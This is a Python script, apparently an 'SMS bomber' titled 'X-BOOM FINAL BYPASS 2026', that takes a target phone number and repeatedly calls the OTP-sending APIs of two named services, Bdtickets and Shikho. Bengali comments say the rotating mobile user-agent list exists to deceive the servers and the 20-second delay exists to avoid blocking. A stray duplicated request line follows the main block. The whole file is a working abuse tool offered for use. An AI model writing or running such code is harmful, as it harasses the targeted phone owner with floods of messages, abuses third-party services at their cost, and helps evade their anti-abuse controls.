import requests, os, time, random

def start():
    os.system('clear')
    print('\033[1;32m[ X-BOOM FINAL BYPASS 2026 ]\033[0m')
    target = input('\n\033[1;32m[+] TARGET: \033[0m')
    amount = int(input('\033[1;32m[+] AMOUNT: \033[0m'))
    
    # এটি সার্ভারকে ধোঁকা দেওয়ার জন্য আসল মোবাইল ব্রাউজারের লিস্ট
    ua_list = [
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36"
    ]

    for i in range(1, amount + 1):
        # প্রতিবার আলাদা পরিচয় ব্যবহার করবে
        headers = {"User-Agent": random.choice(ua_list), "Content-Type": "application/json"}
        
        try:
            # একদম নতুন ও সচল এপিআই (Bdtickets)
            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=5)
            # Shikho API
            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers, timeout=5)
            
            print(f'\033[1;32m[{i}] VIP SUCCESS ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] FAILED\033[0m')
        
        # ব্লকিং এড়াতে ২০ সেকেন্ড গ্যাপ দিন (এটি খুবই গুরুত্বপূর্ণ)
        time.sleep(20)

if __name__ == "__main__":
    start()
requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
